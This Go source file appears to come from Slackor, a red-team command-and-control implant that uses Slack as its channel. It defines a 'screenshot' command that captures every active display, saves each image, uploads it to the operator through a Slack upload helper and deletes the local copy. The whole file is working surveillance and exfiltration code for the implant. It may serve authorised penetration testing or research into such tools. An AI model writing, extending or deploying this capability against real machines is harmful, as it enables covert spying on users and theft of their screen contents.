// +build !darwin
// +build amd64

// TODO: Screenshots on darwin are disabled since it doesn't reliably cross-compile. Fix later.

package common

import (
	"image/png"
	"math/rand"
	"os"
	"strconv"
	"time"

	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/kbinani/screenshot"
)

func randomString(len int) string { //Creates a random string of uppercase letters
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(25)) //A=65 and Z = 65+25
	}
	return string(bytes)
}

// Screenshot takes screenshot(s) and uploads them
type Screenshot struct{}

// Name is the name of the command
func (s Screenshot) Name() string {
	return "screenshot"
}

// Run takes screenshot(s) and uploads them
func (s Screenshot) Run(clientID string, jobID string, args []string) (string, error) {
	n := screenshot.NumActiveDisplays()
	rand.Seed(time.Now().UTC().UnixNano())
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, _ := screenshot.CaptureRect(bounds)
		screen, _ := os.Create(clientID + "_" + strconv.Itoa(i) + "_" + string(time.Now().Format("20060102150405")) + ".png")
		png.Encode(screen, img)
		screen.Close()
		err := slack.Upload(clientID, randomString(5), screen.Name())
		if err != nil {
			return "", err
		}
		os.Remove(string(screen.Name()))
	}
	return "Screenshot(s) uploaded.", nil
}
